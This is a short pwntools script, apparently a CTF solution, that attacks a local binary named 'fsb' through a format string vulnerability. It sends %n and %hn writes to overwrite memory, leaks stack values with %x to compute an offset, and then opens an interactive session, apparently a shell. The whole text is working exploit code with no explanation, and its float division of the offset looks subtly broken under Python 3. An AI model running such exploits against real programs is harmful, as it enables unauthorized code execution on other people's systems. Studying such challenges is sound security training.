
from pwn import *

p = process("./fsb")
p.sendline("c")
print(p.recv(timeout=1).decode())
p.sendline("%134520840c%18$n")
print(p.recv(timeout=1).decode())
p.send("%18$x %14$x")
addr = p.recv(timeout=1).decode().split(" ")
offset = int(addr[0], 16) - int(addr[1], 16) + 0x50
offset /= 4
p.send("%%34475c%%%d$hn" % offset)
p.interactive()